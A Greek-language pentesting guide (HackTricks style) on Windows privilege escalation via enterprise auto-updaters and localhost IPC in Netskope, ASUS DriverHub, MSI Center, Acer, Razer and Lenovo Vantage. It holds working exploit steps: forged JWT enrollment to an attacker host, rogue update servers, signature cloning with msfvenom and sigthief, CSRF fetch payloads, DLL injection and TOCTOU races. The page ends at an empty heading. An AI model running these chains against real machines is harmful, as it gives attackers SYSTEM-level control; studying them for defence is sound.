# Κατάχρηση εταιρικών Auto-Updaters και privileged IPC (π.χ., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία αλυσίδων τοπικής κλιμάκωσης προνομίων στα Windows, οι οποίες εντοπίστηκαν σε agents εταιρικών endpoints και updaters που εκθέτουν μια εύκολα προσβάσιμη επιφάνεια IPC και μια προνομιακή ροή ενημέρωσης. Ένα αντιπροσωπευτικό παράδειγμα είναι το Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας χρήστης με χαμηλά προνόμια μπορεί να εξαναγκάσει την εγγραφή σε server υπό τον έλεγχο του attacker και στη συνέχεια να παραδώσει ένα κακόβουλο MSI που εγκαθίσταται από την υπηρεσία SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Βασικές ιδέες που μπορείτε να εφαρμόσετε ξανά σε παρόμοια προϊόντα:
- Καταχραστείτε το localhost IPC μιας προνομιακής υπηρεσίας για να εξαναγκάσετε την εκ νέου εγγραφή ή την επαναδιαμόρφωση προς έναν server του attacker.
- Υλοποιήστε τα update endpoints του vendor, παραδώστε ένα απατεωνίστικο Trusted Root CA και κατευθύνετε τον updater σε ένα κακόβουλο, «υπογεγραμμένο» πακέτο.
- Παρακάμψτε αδύναμους ελέγχους signer (λίστες επιτρεπόμενων CN), προαιρετικά flags digest και χαλαρές ιδιότητες MSI.
- Αν το IPC είναι «κρυπτογραφημένο», παράγετε το key/IV από αναγνωριστικά μηχανήματος που είναι αναγνώσιμα από όλους και αποθηκεύονται στο registry.
- Αν η υπηρεσία περιορίζει τους callers βάσει διαδρομής image/process name, κάντε inject σε μια διεργασία της λίστας επιτρεπόμενων ή εκκινήστε μία σε suspended κατάσταση και προετοιμάστε το DLL σας μέσω μιας ελάχιστης τροποποίησης του thread context.

Οι προσαρμοσμένες τοπικές υπηρεσίες TCP χρειάζονται τον ίδιο έλεγχο ταυτότητας και ορίων εισόδου, ακόμη κι όταν απαιτούν PIN ή άλλα διαπιστευτήρια εφαρμογής. Αντιστοιχίστε τον listener στη διεργασία του και στον αποτελεσματικό λογαριασμό υπηρεσίας, έπειτα εξετάστε το ακριβές deployed binary/version και αν τα πεδία που ελέγχει ο caller ελέγχονται ως προς το μήκος τους πριν αντιγραφούν σε buffers σταθερού μεγέθους ή χρησιμοποιηθούν για τη δημιουργία εντολής child-process. Οι [οδηγίες της Microsoft για buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) εξηγούν γιατί η μη ελεγμένη εξωτερική είσοδος είναι επικίνδυνη σε προνομιακό native code. Ένας loopback listener, ένα hardcoded διαπιστευτήριο ή ένα όνομα διεργασίας από μόνο του δεν αποδεικνύει αλλοίωση μνήμης ή εκτέλεση ως SYSTEM· η προσβασιμότητα, η εξουσιοδότηση, η διαδρομή του κώδικα και τα mitigations παραμένουν ξεχωριστές προϋποθέσεις. Διατηρήστε τη συνήθη απαρίθμηση παθητική αντί να στέλνετε στη ζωντανή υπηρεσία εισόδους μεγέθους που προκαλούν crash.

---
## 1) Εξαναγκασμός εγγραφής σε server του attacker μέσω localhost IPC

Πολλοί agents διαθέτουν μια διεργασία UI σε user mode, η οποία επικοινωνεί με μια υπηρεσία SYSTEM μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (χαμηλή ακεραιότητα) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ροή exploit:
1) Δημιουργήστε ένα JWT enrollment token, του οποίου τα claims ελέγχουν το backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None ώστε να μην απαιτείται υπογραφή.
2) Στείλτε το μήνυμα IPC που καλεί την εντολή provisioning, μαζί με το JWT και το tenant name:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Η υπηρεσία αρχίζει να στέλνει αιτήματα στον rogue server σου για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν η επαλήθευση του caller βασίζεται στο path/name, ξεκίνα το αίτημα από ένα allow-listed vendor binary (βλ. §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Hijacking του update channel για εκτέλεση κώδικα ως SYSTEM

Μόλις ο client επικοινωνήσει με τον server σου, υλοποίησε τα αναμενόμενα endpoints και κατεύθυνέ τον σε ένα MSI του attacker. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επέστρεψε JSON config με πολύ σύντομο updater interval, π.χ.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα πιστοποιητικό CA σε μορφή PEM. Η υπηρεσία το εγκαθιστά στο store Trusted Root του Local Machine.
3) /v2/checkupdate → Παρέχει metadata που παραπέμπουν σε ένα κακόβουλο MSI και μια πλαστή έκδοση.

Παράκαμψη συνηθισμένων ελέγχων που συναντώνται στην πράξη:
- Allow-list Signer CN: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN ισούται με «netSkope Inc» ή «Netskope, Inc.». Η δική σας rogue CA μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- Ιδιότητα CERT_DIGEST: συμπεριλάβετε μια ακίνδυνη ιδιότητα MSI με όνομα CERT_DIGEST. Δεν εφαρμόζεται κανένας έλεγχος κατά την εγκατάσταση.
- Προαιρετικός έλεγχος digest: μια σημαία ρύθμισης (π.χ. check_msi_digest=false) απενεργοποιεί τον πρόσθετο κρυπτογραφικό έλεγχο.

Αποτέλεσμα: η υπηρεσία SYSTEM εγκαθιστά το MSI από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας αυθαίρετο κώδικα ως NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Δίδαγμα από την παράκαμψη του patch: αν ένας vendor απαντήσει προσθέτοντας σε allow-list ένα μικρό σύνολο «έμπιστων» domains αντί να πιστοποιήσει κρυπτογραφικά την πηγή της ενημέρωσης, αναζητήστε redirectors ή reverse proxies που ανήκουν στον vendor και εξακολουθούν να σας επιτρέπουν να κατευθύνετε την κίνηση. Στην περίπτωση του Netskope, μεταγενέστερη δημόσια έρευνα έδειξε ότι μια allow-list της εποχής R129 μπορούσε και πάλι να γίνει αντικείμενο εκμετάλλευσης μέσω του `rproxy.goskope.com`, το οποίο έκανε proxy περιεχόμενο από Azure App Service που ελεγχόταν από τον επιτιθέμενο. Αντιμετωπίζετε τις allow-list ονομάτων host ως εμπόδιο καθυστέρησης, όχι ως όριο εμπιστοσύνης.<sup>[[14]](#references)</sup>

---
## 3) Παραποίηση κρυπτογραφημένων αιτημάτων IPC (όπου υπάρχουν)

Από την έκδοση R127, το Netskope περιέβαλλε το JSON του IPC σε ένα πεδίο encryptData που μοιάζει με Base64. Η αντίστροφη ανάλυση έδειξε χρήση AES, με κλειδί/IV που προκύπτουν από τιμές μητρώου αναγνώσιμες από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι επιτιθέμενοι μπορούν να αναπαράγουν την κρυπτογράφηση και να στέλνουν έγκυρες κρυπτογραφημένες εντολές από έναν τυπικό χρήστη.<sup>[[1]](#references)[[2]](#references)</sup> Γενική συμβουλή: αν ένας agent αρχίσει ξαφνικά να «κρυπτογραφεί» το IPC του, αναζητήστε device IDs, product GUIDs και install IDs στο HKLM που χρησιμοποιούνται ως υλικό κρυπτογράφησης.

---
## 4) Παράκαμψη allow-list καλούντων IPC (έλεγχοι διαδρομής/ονόματος)

Ορισμένες υπηρεσίες προσπαθούν να πιστοποιήσουν τον peer, βρίσκοντας το PID της σύνδεσης TCP και συγκρίνοντας τη διαδρομή/το όνομα του image με allow-list vendor binaries που βρίσκονται κάτω από το Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικές μέθοδοι παράκαμψης:
- DLL injection σε μια διεργασία που βρίσκεται στην allow-list (π.χ., nsdiag.exe) και proxy του IPC από το εσωτερικό της.
- Εκκίνηση ενός binary που βρίσκεται στην allow-list σε ανασταλμένη κατάσταση και αρχικοποίηση του proxy DLL χωρίς CreateRemoteThread (βλ. §5), ώστε να ικανοποιούνται οι κανόνες προστασίας από παραβίαση του driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection συμβατό με την προστασία από παραβίαση: ανασταλμένη διεργασία + patch στο NtContinue

Τα προϊόντα συχνά περιλαμβάνουν έναν driver minifilter/OB callbacks (π.χ., Stadrv) για να αφαιρεί επικίνδυνα δικαιώματα από handles προς προστατευμένες διεργασίες:
- Process: αφαιρεί τα PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει τα δικαιώματα στα THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user-mode loader που τηρεί αυτούς τους περιορισμούς:
1) Δημιουργήστε μια διεργασία vendor binary με CREATE_SUSPENDED.
2) Αποκτήστε handles για τα οποία εξακολουθείτε να έχετε δικαιώματα: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στη διεργασία και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή μόνο THREAD_RESUME, αν κάνετε patch στον κώδικα σε γνωστό RIP).
3) Αντικαταστήστε το ntdll!NtContinue (ή κάποιο άλλο πρώιμο thunk που είναι εγγυημένα φορτωμένο) με ένα μικρό stub που καλεί τη LoadLibraryW με τη διαδρομή του DLL σας και έπειτα επιστρέφει.
4) Καλέστε ResumeThread για να εκτελεστεί το stub μέσα στη διεργασία και να φορτωθεί το DLL σας.

Επειδή δεν χρησιμοποιήσατε τα PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε μια ήδη προστατευμένη διεργασία (την δημιουργήσατε εσείς), η πολιτική του driver τηρείται.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Πρακτικά εργαλεία
- Το NachoVPN (plugin του Netskope) αυτοματοποιεί τη δημιουργία rogue CA, την υπογραφή κακόβουλου MSI και την παροχή των απαιτούμενων endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- Το UpSkope είναι ένας custom client IPC που δημιουργεί αυθαίρετα μηνύματα IPC (προαιρετικά κρυπτογραφημένα με AES) και περιλαμβάνει το injection ανασταλμένης διεργασίας, ώστε τα μηνύματα να προέρχονται από ένα binary που βρίσκεται στην allow-list.<sup>[[4]](#references)</sup>

## 7) Γρήγορη ροή εργασίας για αρχική διαλογή άγνωστων επιφανειών updater/IPC

Όταν εξετάζετε έναν νέο endpoint agent ή μια σουίτα «helper» για motherboard, συνήθως αρκεί μια γρήγορη ροή εργασίας για να διαπιστώσετε αν πρόκειται για υποσχόμενο στόχο privesc:<sup>[[6]](#references)</sup>

1) Καταγράψτε τους loopback listeners και αντιστοιχίστε τους στις διεργασίες των vendor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Απαριθμήστε τα υποψήφια named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Συλλέξτε δεδομένα δρομολόγησης από το registry που χρησιμοποιούνται από διακομιστές IPC βασισμένους σε plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Εξαγάγετε πρώτα τα ονόματα των endpoint, τα JSON keys και τα command IDs από τον client σε user mode. Τα packed Electron/.NET frontends συχνά κάνουν leak ολόκληρο το schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Εντοπίστε την πραγματική συνθήκη εμπιστοσύνης, όχι απλώς τη διαδρομή κώδικα που τελικά εκκινεί τη διεργασία:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Μοτίβα που αξίζει να μπουν σε προτεραιότητα:
- Το `CryptQueryObject`/parsing πιστοποιητικών χωρίς `WinVerifyTrust` συνήθως σημαίνει ότι το «υπάρχει πιστοποιητικό» θεωρήθηκε ισοδύναμο με το «το πιστοποιητικό είναι έμπιστο», επιτρέποντας cloning πιστοποιητικών ή άλλα κόλπα με fake signer.
- Οι έλεγχοι substring/suffix σε `Origin`, `Referer`, URL λήψεων, ονόματα διεργασιών ή signer CNs δεν αποτελούν authentication. Το `contains(".vendor.com")` είναι συνήθως exploitable με lookalike domains που ελέγχει ο attacker.
- Αν το GUI με χαμηλά προνόμια αποφασίζει «το αρχείο είναι έμπιστο» και ο SYSTEM broker απλώς χρησιμοποιεί αυτό το αποτέλεσμα, η τροποποίηση ή επανυλοποίηση του client-side DLL/JS συχνά παρακάμπτει εντελώς το όριο ασφαλείας (διαχωρισμός validation τύπου Razer).
- Αν ο broker αντιγράφει ένα payload στο `%TEMP%`/`C:\Windows\Temp` και μετά το επικυρώνει ή προγραμματίζει την εκτέλεσή του από εκείνη τη διαδρομή, ελέγξτε αμέσως για παράθυρα αντικατάστασης TOCTOU και για sibling plugin modules που εκθέτουν εναλλακτικά wrappers `ExecuteTask()` με ασθενέστερους ελέγχους.<sup>[[6]](#references)</sup>

Για targets με πολλά named pipes, το PipeViewer είναι ένας γρήγορος τρόπος να εντοπίσετε αδύναμα DACLs και pipes προσβάσιμα απομακρυσμένα, πριν αρχίσετε να κάνετε reverse engineering σε βάθος το πρωτόκολλο.<sup>[[11]](#references)</sup>

Αν το target κάνει authentication στους callers μόνο μέσω PID, image path ή process name, αντιμετωπίστε το ως εμπόδιο ταχύτητας και όχι ως όριο ασφαλείας: συχνά αρκεί να κάνετε injection στη νόμιμη client ή να συνδεθείτε από allow-listed process, ώστε να ικανοποιηθούν οι έλεγχοι του server. Ειδικά για named pipes, [αυτή η σελίδα για client impersonation και pipe abuse](named-pipe-client-impersonation.md) καλύπτει το primitive με περισσότερες λεπτομέρειες.

Για έναν privileged **broker εκκαθάρισης ή επαναφοράς**, ελέγξτε το όριο εμπιστοσύνης των paths, καθώς και το pipe ACL. Ένας caller με χαμηλότερα προνόμια μπορεί να έχει τη δυνατότητα να επιλέξει έναν προορισμό επαναφοράς ή να μετονομάσει ένα προσωρινό backup artifact σε κοινόχρηστο κατάλογο, ακόμη κι όταν το εκτελέσιμο της υπηρεσίας και ο κατάλογος εγκατάστασής της είναι προστατευμένα. Επιβεβαιώστε ξεχωριστά ότι ο caller μπορεί να φτάσει στην εντολή επαναφοράς, να τροποποιήσει το ακριβές προσωρινό input ή filename, ότι ο broker εκτελείται με υψηλότερη ταυτότητα και ότι η λειτουργία επαναφοράς γράφει πράγματι στο επιλεγμένο προστατευμένο path. Ένας εγγράψιμος staging directory ή ένα αναγνώσιμο pipe από μόνο του δεν αποδεικνύει δυνατότητα αυθαίρετης εγγραφής με elevated privileges· απαιτείται code review ή ελεγχόμενη δοκιμή της αντιστοίχισης προορισμού και της συμπεριφοράς της υπηρεσίας. Μην εκτελείτε άγνωστη εντολή εκκαθάρισης κατά την παθητική απαρίθμηση, καθώς μπορεί να διαγράψει αρχεία χρήστη.

---
## 8) Modular add-in brokers με authentication μόνο μέσω υπογραφών vendor (μοτίβο Lenovo Vantage)

Μια νεότερη παραλλαγή που αξίζει να αναζητήσετε είναι ο **signed-client RPC broker**: μια desktop process της Lenovo με χαμηλά προνόμια επικοινωνεί με μια SYSTEM service, και η υπηρεσία δρομολογεί εντολές JSON σε ένα σύνολο add-ins που περιγράφονται σε XML και βρίσκονται κάτω από το `%ProgramData%`. Μόλις επιτευχθεί code execution **μέσα σε οποιονδήποτε αποδεκτό signed client**, κάθε contract `runas="system"` γίνεται μέρος της attack surface σας.<sup>[[15]](#references)</sup>

Primitives υψηλής αξίας που παρατηρήθηκαν σε έρευνα για το Lenovo Vantage:
- **Εμπιστοσύνη στον caller επειδή έχει υπογραφεί από τον vendor**: οι ερευνητές απέκτησαν authenticated context αντιγράφοντας ένα Lenovo-signed EXE σε εγγράψιμο κατάλογο και ικανοποιώντας ένα DLL side-load (`profapi.dll`), ώστε να εκτελεστεί arbitrary code μέσα σε client που η υπηρεσία ήδη εμπιστευόταν.
- **Ανακάλυψη attack surface μέσω manifest**: τα add-ins δηλώνονται κάτω από το `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`· αρκετά contracts εκτελούνται ως `SYSTEM`, επομένως η απαρίθμηση αυτών των manifests συχνά αποκαλύπτει τα πραγματικά privileged verbs ταχύτερα από το reverse engineering του ίδιου του broker.
- **Bugs ανά εντολή πίσω από το authenticated channel**: αφού εισέλθουν στον έμπιστο client, δημόσιες έρευνες εντόπισαν path-traversal + race conditions σε verbs ενημέρωσης/εγκατάστασης, κατάχρηση raw-SQL σε privileged settings databases και ελέγχους registry paths βασισμένους σε substring, οι οποίοι επέτρεπαν εγγραφές έξω από το προβλεπόμενο hive.

Χρήσιμο recon σε ένα target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Πρακτικό συμπέρασμα: όταν μια σουίτα βοηθητικών εργαλείων εκθέτει έναν broker που πρώτα πιστοποιεί τη **διεργασία που κάνει την κλήση** και μετά δρομολογεί τις εντολές σε δεκάδες πρόσθετα/add-ins, μην σταματάς αφού παρακάμψεις τον έλεγχο εμπιστοσύνης στην είσοδο. Κάνε dump τον πίνακα manifest/contract και κάνε fuzzing ξεχωριστά σε κάθε εντολή υψηλών προνομίων· το πιστοποιημένο κανάλι συνήθως κρύβει αρκετά σφάλματα δεύτερου σταδίου.

---
## 1) CSRF από browser προς localhost σε προνομιακά HTTP APIs (ASUS DriverHub)

Το DriverHub εγκαθιστά μια υπηρεσία HTTP σε user mode (ADU.exe) στη διεύθυνση 127.0.0.1:53000, η οποία αναμένει κλήσεις από browser που προέρχονται από το https://driverhub.asus.com. Το φίλτρο origin εκτελεί απλώς `string_contains(".asus.com")` στην κεφαλίδα Origin και στις διευθύνσεις URL λήψης που εκτίθενται από το `/asus/v1.0/*`. Επομένως, οποιοσδήποτε host ελέγχεται από επιτιθέμενο, όπως το `https://driverhub.asus.com.attacker.tld`, περνά τον έλεγχο και μπορεί να στείλει αιτήματα που αλλάζουν την κατάσταση μέσω JavaScript.<sup>[[6]](#references)</sup> Δες τα [βασικά του CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) για επιπλέον μοτίβα παράκαμψης.

Πρακτική ροή:
1) Καταχώρισε ένα domain που περιέχει το `.asus.com` και φιλοξένησε εκεί μια κακόβουλη ιστοσελίδα.
2) Χρησιμοποίησε `fetch` ή XHR για να καλέσεις ένα προνομιακό endpoint (π.χ. `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλε το JSON body που αναμένει ο handler – το packed frontend JS εμφανίζει το παρακάτω schema.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Ακόμη και το PowerShell CLI που εμφανίζεται παρακάτω λειτουργεί επιτυχώς όταν γίνεται πλαστογράφηση της κεφαλίδας Origin, ώστε να έχει την έμπιστη τιμή:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Οποιαδήποτε επίσκεψη με browser στον ιστότοπο του attacker μετατρέπεται επομένως σε local CSRF με 1 click (ή 0 click μέσω `onload`), που ενεργοποιεί έναν helper με δικαιώματα SYSTEM.

---
## 2) Μη ασφαλής επαλήθευση code-signing και κλωνοποίηση πιστοποιητικού (ASUS UpdateApp)

Το `/asus/v1.0/UpdateApp` κατεβάζει αυθαίρετα εκτελέσιμα που ορίζονται στο JSON body και τα αποθηκεύει προσωρινά στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η επικύρωση του URL λήψης χρησιμοποιεί την ίδια λογική υποσυμβολοσειράς, οπότε γίνεται δεκτό το `http://updates.asus.com.attacker.tld:8000/payload.exe`. Μετά τη λήψη, το ADU.exe απλώς ελέγχει ότι το PE περιέχει υπογραφή και ότι η συμβολοσειρά Subject ταιριάζει με ASUS πριν το εκτελέσει — χωρίς `WinVerifyTrust` και χωρίς επικύρωση αλυσίδας.

Για να οπλοποιήσετε τη ροή:
1) Δημιουργήστε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε τον signer της ASUS σε αυτό (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε ένα domain-απομίμηση `.asus.com` και ενεργοποιήστε το UpdateApp μέσω του παραπάνω browser CSRF.

Επειδή τόσο τα φίλτρα Origin όσο και τα φίλτρα URL βασίζονται σε υποσυμβολοσειρές, ενώ ο έλεγχος signer απλώς συγκρίνει συμβολοσειρές, το DriverHub κατεβάζει και εκτελεί το binary του attacker με αυξημένα δικαιώματα.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU στις διαδρομές αντιγραφής/εκτέλεσης του updater (MSI Center CMD_AutoUpdateSDK)

Η υπηρεσία SYSTEM του MSI Center εκθέτει ένα TCP protocol όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το βασικό component (Component ID `0f 27 00 00`) περιλαμβάνει το `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το παρεχόμενο εκτελέσιμο στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει την υπογραφή μέσω `CS_CommonAPI.EX_CA::Verify` (το certificate subject πρέπει να είναι ίσο με “MICRO-STAR INTERNATIONAL CO., LTD.” και το `WinVerifyTrust` να επιτύχει).
3) Δημιουργεί μια scheduled task που εκτελεί το προσωρινό αρχείο ως SYSTEM με arguments που ελέγχει ο attacker.

Το αντιγραμμένο αρχείο δεν κλειδώνεται μεταξύ της επαλήθευσης και του `ExecuteTask()`. Ένας attacker μπορεί να:
- Στείλει το Frame A με αναφορά σε ένα νόμιμο binary υπογεγραμμένο από την MSI (εξασφαλίζει ότι ο έλεγχος υπογραφής θα περάσει και ότι η task θα προγραμματιστεί).
- Ανταγωνιστεί με επαναλαμβανόμενα μηνύματα Frame B που δείχνουν σε ένα κακόβουλο payload, αντικαθιστώντας το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση της επαλήθευσης.

Όταν ενεργοποιηθεί ο scheduler, εκτελεί το αντικατεστημένο payload ως SYSTEM, παρότι είχε επικυρώσει το αρχικό αρχείο. Η αξιόπιστη εκμετάλλευση χρησιμοποιεί δύο goroutines/threads που στέλνουν επανειλημμένα `CMD_AutoUpdateSDK` μέχρι να κερδηθεί το παράθυρο TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Κατάχρηση custom IPC επιπέδου SYSTEM και impersonation (MSI Center + Acer Control Centre)

### Σύνολα εντολών TCP του MSI Center
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID, το οποίο αποθηκεύεται στο `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους attackers να δρομολογούν εντολές σε αυθαίρετα modules.
- Τα plugins μπορούν να ορίσουν δικά τους task runners. Το `Support\API_Support.dll` εκθέτει το `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` **χωρίς επικύρωση υπογραφής** — οποιοσδήποτε local user μπορεί να το κατευθύνει στο `C:\Users\<user>\Desktop\payload.exe` και να εκτελέσει κώδικα ως SYSTEM με προβλέψιμο τρόπο.
- Η παρακολούθηση loopback με Wireshark ή η ανάλυση των .NET binaries στο dnSpy αποκαλύπτει γρήγορα την αντιστοίχιση Component ↔ command· στη συνέχεια, custom Go/Python clients μπορούν να επαναλάβουν τα frames.<sup>[[6]](#references)</sup>

### Named pipes του Acer Control Centre και επίπεδα impersonation
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode`, και το discretionary ACL του επιτρέπει remote clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή command ID `7` μαζί με μια διαδρομή αρχείου καλεί τη ρουτίνα της υπηρεσίας για τη δημιουργία διεργασίας.
- Η client library σειριοποιεί ένα magic terminator byte (113) μαζί με τα args. Η δυναμική ανάλυση με Frida/`TsDotNetLib` (δείτε το [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για συμβουλές σχετικά με την ανάλυση) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε ένα `SECURITY_IMPERSONATION_LEVEL` και integrity SID πριν καλέσει το `CreateProcessAsUser`.
- Η αντικατάσταση του 113 (`0x71`) με 114 (`0x72`) οδηγεί στο γενικό branch, το οποίο διατηρεί ολόκληρο το SYSTEM token και ορίζει ένα high-integrity SID (`S-1-16-12288`). Έτσι, το binary που δημιουργείται εκτελείται ως SYSTEM χωρίς περιορισμούς, τόσο τοπικά όσο και μεταξύ μηχανημάτων.
- Συνδυάστε το με το εκτεθειμένο flag του installer (`Setup.exe -nocheck`) για να εγκαταστήσετε το ACC ακόμη και σε εργαστηριακά VM και να δοκιμάσετε το pipe χωρίς hardware του vendor.<sup>[[6]](#references)</sup>

Αυτά τα IPC bugs αναδεικνύουν γιατί οι υπηρεσίες localhost πρέπει να επιβάλλουν mutual authentication (ALPC SIDs, φίλτρα `ImpersonationLevel=Impersonation`, token filtering) και γιατί ο helper κάθε module για «εκτέλεση αυθαίρετου binary» πρέπει να χρησιμοποιεί τις ίδιες επαληθεύσεις signer.

---
## 3) Helpers COM/IPC “elevator” με αδύναμη επικύρωση σε user mode (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο μοτίβο σε αυτή την κατηγορία: ένας χρήστης με χαμηλά δικαιώματα μπορεί να ζητήσει από έναν COM helper να εκκινήσει μια διεργασία μέσω του `RzUtility.Elevator`, ενώ η απόφαση εμπιστοσύνης ανατίθεται σε ένα DLL user mode (`simple_service.dll`) αντί να επιβάλλεται με ισχυρό τρόπο εντός του προνομιακού ορίου.

Παρατηρημένη διαδρομή εκμετάλλευσης:
- Δημιουργήστε instance του COM object `RzUtility.Elevator`.
- Καλέστε `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσετε εκκίνηση με αυξημένα δικαιώματα.
- Στο δημόσιο PoC, το PE-signature gate μέσα στο `simple_service.dll` παρακάμπτεται με patch πριν από την αποστολή του αιτήματος, επιτρέποντας την εκκίνηση ενός αυθαίρετου εκτελέσιμου που επιλέγει ο attacker.<sup>[[6]](#references)[[10]](#references)</sup>

Ελάχιστη κλήση PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Γενικό συμπέρασμα: κατά την ανάλυση «helper» suites, μην περιορίζεστε στο localhost TCP ή στα named pipes. Ελέγξτε για COM classes με ονόματα όπως `Elevator`, `Launcher`, `Updater` ή `Utility` και, στη συνέχεια, επαληθεύστε αν η προνομιούχα υπηρεσία επικυρώνει πράγματι η ίδια το binary-στόχο ή απλώς εμπιστεύεται ένα αποτέλεσμα που υπολογίζει ένα DLL client σε user mode, το οποίο μπορεί να τροποποιηθεί. Αυτό το μοτίβο γενικεύεται πέρα από τη Razer: κάθε σχεδιασμός όπου ο broker υψηλών προνομίων χρησιμοποιεί μια απόφαση allow/deny από την πλευρά χαμηλών προνομίων αποτελεί πιθανή επιφάνεια privesc.


---
## Εκτέλεση προβλέψιμου temp script κατά την επιδιόρθωση MSI (Checkmk Agent / CVE-2024-0670)

